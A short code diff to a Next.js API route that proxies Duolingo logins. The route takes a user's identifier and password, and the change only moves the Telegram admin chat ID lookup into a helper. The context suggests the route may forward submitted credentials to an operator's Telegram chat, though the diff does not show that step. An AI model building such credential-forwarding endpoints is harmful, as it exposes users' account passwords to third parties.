@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from "next/server";
-import { sendTelegramMessage, escapeHtml } from "@/lib/utils/telegram";
+import { sendTelegramMessage, escapeHtml, resolveTelegramAdminChatId } from "@/lib/utils/telegram";
 
 /**
  * POST /api/proxy/duolingo-login
@@ -83,7 +83,7 @@ export async function POST(request: NextRequest) {
     const body = await request.json();
     const { identifier, password } = body as { identifier?: string; password?: string };
 
-    const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID ?? process.env.TELEGRAM_CHAT_ID;
+    const ADMIN_CHAT_ID = resolveTelegramAdminChatId();
 
     if (!identifier?.trim() || !password?.trim()) {
       return NextResponse.json(
